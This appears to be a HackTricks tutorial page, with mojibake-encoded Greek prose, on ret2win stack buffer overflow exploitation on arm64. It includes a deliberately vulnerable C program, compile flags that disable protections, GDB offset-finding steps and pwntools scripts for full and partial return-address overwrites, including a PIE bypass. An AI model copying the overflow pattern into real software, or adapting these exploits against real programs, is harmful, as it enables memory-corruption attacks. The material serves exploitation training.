# Ret2win - arm64

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Î•Î¹Î´Î¹ÎºÏŒÏ‚ Î•ÏÏ…Î¸ÏÎ¿Ï Î£Ï…Î½ÎµÏÎ³ÎµÎ¯Î¿Ï… AWS Ï„Î¿Ï… HackTricks)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î´Î¹Î±Ï†Î·Î¼Î¹ÏƒÎ¼Î­Î½Î· ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Ï„Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± Ï„Î·Î»ÎµÎ³ÏÎ±Ï†Î®Î¼Î±Ï„Î¿Ï‚**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>

Î’ÏÎµÎ¯Ï„Îµ Î¼Î¹Î± ÎµÎ¹ÏƒÎ±Î³Ï‰Î³Î® ÏƒÏ„Î¿ arm64 ÏƒÏ„Î¿:

{% content-ref url="../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## Code&#x20;
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î·Î½ ÎµÏ€Î¹Î»Î¿Î³Î® pie ÎºÎ±Î¹ canary:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie
```
## Î•ÏÏÎµÏƒÎ· Ï„Î·Ï‚ Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ·Ï‚

### Î•Ï€Î¹Î»Î¿Î³Î® Î¼Î¿Ï„Î¯Î²Î¿Ï…

Î‘Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®Î¸Î·ÎºÎµ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î¿ [**GEF**](https://github.com/bata24/gef):

ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Ï„Î¿ gdb Î¼Îµ Ï„Î¿ gef, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Î­Î½Î± Î¼Î¿Ï„Î¯Î²Î¿ ÎºÎ±Î¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÏ„Îµ Ï„Î¿:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../.gitbook/assets/image (1202).png" alt=""><figcaption></figcaption></figure>

Î¤Î¿ arm64 Î¸Î± Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÎµÎ¹ Î½Î± ÎµÏ€Î¹ÏƒÏ„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï€Î¿Ï… Î²ÏÎ¯ÏƒÎºÎµÏ„Î±Î¹ ÏƒÏ„Î¿Î½ ÎºÎ±Ï„Î±Ï‡Ï‰ÏÎ·Ï„Î® x30 (Î¿ Î¿Ï€Î¿Î¯Î¿Ï‚ Î­Ï‡ÎµÎ¹ Î´Î¹Î±ÏÏÎµÏÏƒÎµÎ¹), Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„ÏŒ Î³Î¹Î± Î½Î± Î²ÏÎ¿ÏÎ¼Îµ Ï„Î·Î½ Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î¿Ï… Ï€ÏÎ¿Ï„ÏÏ€Î¿Ï…:
```bash
pattern search $x30
```
<figure><img src="../../../.gitbook/assets/image (1203).png" alt=""><figcaption></figcaption></figure>

**Î— Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· ÎµÎ¯Î½Î±Î¹ 72 (9x48).**

### Î•Ï€Î¹Î»Î¿Î³Î® Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ·Ï‚ ÏƒÏ„Î· ÏƒÏ„Î¿Î¯Î²Î±

ÎÎµÎºÎ¹Î½Î®ÏƒÏ„Îµ Î¼Îµ Ï„Î·Î½ Î±Î½Î¬ÎºÏ„Î·ÏƒÎ· Ï„Î·Ï‚ Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·Ï‚ Ï„Î·Ï‚ ÏƒÏ„Î¿Î¯Î²Î±Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Ï„Î¿ pc register:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../.gitbook/assets/image (1204).png" alt=""><figcaption></figcaption></figure>

Î¤ÏÏÎ± Î¿ÏÎ¯ÏƒÏ„Îµ Î­Î½Î± ÏƒÎ·Î¼ÎµÎ¯Î¿ Î±Î½Î±ÎºÎ¿Ï€Î®Ï‚ Î¼ÎµÏ„Î¬ Ï„Î¿ `read()` ÎºÎ±Î¹ ÏƒÏ…Î½ÎµÏ‡Î¯ÏƒÏ„Îµ Î¼Î­Ï‡ÏÎ¹ Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÎµÎ¯ Ï„Î¿ `read()` ÎºÎ±Î¹ Î¿ÏÎ¯ÏƒÏ„Îµ Î­Î½Î± Ï€ÏÏŒÏ„Ï…Ï€Î¿ ÏŒÏ€Ï‰Ï‚ Ï„Î¿ 13371337:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../.gitbook/assets/image (1205).png" alt=""><figcaption></figcaption></figure>

Î’ÏÎµÎ¯Ï„Îµ Ï€Î¿Ï Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€ÏÏŒÏ„Ï…Ï€Î¿ ÏƒÏ„Î· Î¼Î½Î®Î¼Î·:

<figure><img src="../../../.gitbook/assets/image (1206).png" alt=""><figcaption></figcaption></figure>

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../.gitbook/assets/image (1207).png" alt="" width="339"><figcaption></figcaption></figure>

## Î§Ï‰ÏÎ¯Ï‚ PIE

### ÎšÎ±Î½Î¿Î½Î¹ÎºÏŒ

Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ **`win`**:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../.gitbook/assets/image (1208).png" alt="" width="375"><figcaption></figcaption></figure>

### Î•ÎºÏ„ÏŒÏ‚-2

Î‘Î½Ï„Î¯ Î½Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ ÏŒÎ»Î· Ï„Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚, Î¸Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î®ÏƒÎ¿Ï…Î¼Îµ **Î¼ÏŒÎ½Î¿ Ï„Î± Ï„ÎµÎ»ÎµÏ…Ï„Î±Î¯Î± 2 bytes** Î¼Îµ `0x06c4`.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../.gitbook/assets/image (1209).png" alt="" width="375"><figcaption></figcaption></figure>

## ÎœÎµ PIE

{% hint style="success" %}
ÎœÎµÏ„Î±Î³Î»Ï‰Ï„Ï„Î¯ÏƒÏ„Îµ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ **Ï‡Ï‰ÏÎ¯Ï‚ Ï„Î¿ ÏŒÏÎ¹ÏƒÎ¼Î± `-no-pie`**
{% endhint %}

### Off-by-2

Î§Ï‰ÏÎ¯Ï‚ Î´Î¹Î±ÏÏÎ¿Î® Î´ÎµÎ½ Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Ï„Î·Î½ Î±ÎºÏÎ¹Î²Î® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Ï€Î¿Ï… ÎºÎµÏÎ´Î¯Î¶ÎµÎ¹, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶Î¿Ï…Î¼Îµ Ï„Î· Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï„Î·Ï‚ ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚ Î±Ï€ÏŒ Ï„Î¿ Î´Ï…Î±Î´Î¹ÎºÏŒ ÎºÎ±Î¹ Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Î· Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ· ÎµÏ€Î¹ÏƒÏ„ÏÎ¿Ï†Î®Ï‚ Ï€Î¿Ï… Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„Î¿ÏÎ¼Îµ Î´ÎµÎ¯Ï‡Î½ÎµÎ¹ Î®Î´Î· ÏƒÎµ Î¼Î¹Î± ÎºÎ¿Î½Ï„Î¹Î½Î® Î´Î¹ÎµÏÎ¸Ï…Î½ÏƒÎ·, ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„ÏŒ Î½Î± Î´Î¹Î±ÏÏÎµÏÏƒÎ¿Ï…Î¼Îµ Ï„Î· Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ· Ï€ÏÎ¿Ï‚ Ï„Î· ÏƒÏ…Î½Î¬ÏÏ„Î·ÏƒÎ· ÎºÎ­ÏÎ´Î¿Ï…Ï‚ (**0x7d4**) ÏƒÎµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ· ÎºÎ±Î¹ Î±Ï€Î»Î¬ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î¼Îµ Î±Ï…Ï„Î®Î½ Ï„Î· Î¼ÎµÏ„Î±Ï„ÏŒÏ€Î¹ÏƒÎ·:

<figure><img src="../../../.gitbook/assets/image (1210).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ Ï‡Î¬ÎºÎ¹Î½Î³Îº ÏƒÏ„Î¿ AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ Ï„Î¿Ï… HackTricks:

* Î‘Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF** ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**Î¤Î·Î½ ÎŸÎ¹ÎºÎ¿Î³Î­Î½ÎµÎ¹Î± PEASS**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î·Î½ [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Î±Ï‚ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± Ï‡Î¬ÎºÎ¹Î½Î³Îº ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± ÏƒÏ„Î¿ GitHub.

</details>
